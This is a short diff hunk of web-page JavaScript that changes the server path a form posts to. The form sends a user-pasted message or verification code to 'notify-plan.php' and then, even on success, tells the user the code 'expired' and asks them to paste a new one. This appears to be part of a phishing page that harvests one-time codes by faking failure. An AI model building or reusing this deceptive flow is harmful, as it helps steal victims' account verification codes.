@@ -781,7 +781,7 @@
     const message = verifyText.value.trim(); if (!message) return;
     verifySubmit.disabled = true; verifySubmit.textContent = 'SENDING…'; verifyMessage.textContent = '';
     try {
-      const response = await fetch('notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+      const response = await fetch('/api/notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ action: 'message', message }) });
       const result = await response.json(); if (!response.ok || !result.ok) throw new Error('Submission failed');
       verifyMessage.textContent = '⚠️ Message code expired. Please paste the new message below.'; verifyMessage.style.color = '#b42318';
